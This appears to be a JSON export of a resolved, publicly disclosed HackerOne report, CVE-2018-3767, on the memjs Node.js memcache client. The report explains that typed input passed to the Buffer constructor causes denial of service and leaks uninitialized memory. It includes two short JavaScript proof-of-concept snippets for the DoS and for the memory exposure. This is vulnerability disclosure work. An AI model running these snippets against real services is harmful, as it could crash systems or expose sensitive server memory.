{
  "id": 319809,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTk4MDk=",
  "url": "https://hackerone.com/reports/319809",
  "title": "`memjs` allocates and stores buffers on typed input, resulting in DoS and uninitialized memory usage",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-02-26T15:11:42.082Z",
  "submitted_at": "2018-02-26T15:11:42.082Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "chalker",
    "url": "/chalker",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-3767"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-06-27T05:25:55.386Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-06-27T05:25:42.512Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a Buffer allocation vulnerability in `memjs`.\n\nIn cases when the attacker is able to pass typed input (e.g. via JSON) to the storage, it allows to cause DoS (on all Node.js versions) and to store (and potentially later extract) chunks of uninitialized server memory containing sensitive data.\n\n# Module\n\n**module name:** `memjs`\n**version:** 1.1.0\n**npm page:** `https://www.npmjs.com/package/memjs`\n\n## Module Description\n\n> MemJS is a pure Node.js client library for using memcache, in particular, the MemCachier service. It uses the binary protocol and support SASL authentication.\n\n## Module Stats\n\n186 downloads in the last day\n2 903 downloads in the last week\n12 037 downloads in the last month\n\n~144 444 estimated downloads per year *(yay, a pretty number)*\n\n# Vulnerability\n\n## Vulnerability Description\n\n`memjs` passes `value` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'value' parameter (e.g. JSON).\n\n## Steps To Reproduce:\n\n`memcached` should be up and running.\n\n### DoS\n\n```js\nvar client = require('memjs').Client.create()\nfunction tick() {\n  var value = 2e9;\n  client.set('key', value, {expires: 600 }, () => {});\n}\nsetInterval(tick, 200);\n```\n\n### Uninitialized memory exposed (when running on Node.js below 8.0)\n\n```js\nvar client = require('memjs').Client.create()\nvar value = 100;\nclient.set('key', value, {expires: 600 }, () => {});\nclient.get('key', (err, val) => console.log(val));\n```\n\n## Supporting Material/References:\n\n- OS: Arch Linux current\n- Node.js 9.5.0\n- npm 5.6.0\n- memcached 1.5.5\n\n# Wrap up\n\n- I contacted the maintainer to let him know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nDenial of service\nSensitive data leak (on Node.js < 8.x)",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-07-27T05:25:42.603Z",
  "allow_singular_disclosure_after": -175160027.4898656,
  "singular_disclosure_allowed": true,
  "vote_count": 11,
  "voters": [
    "bl4de",
    "savitar0x01",
    "apapedulimu",
    "geeknik",
    "eveeez",
    "truwa",
    "japz",
    "cryptographer",
    "wragg-s",
    "rshrikrishna",
    "and 1 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 10.0,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 11198,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "memjs",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
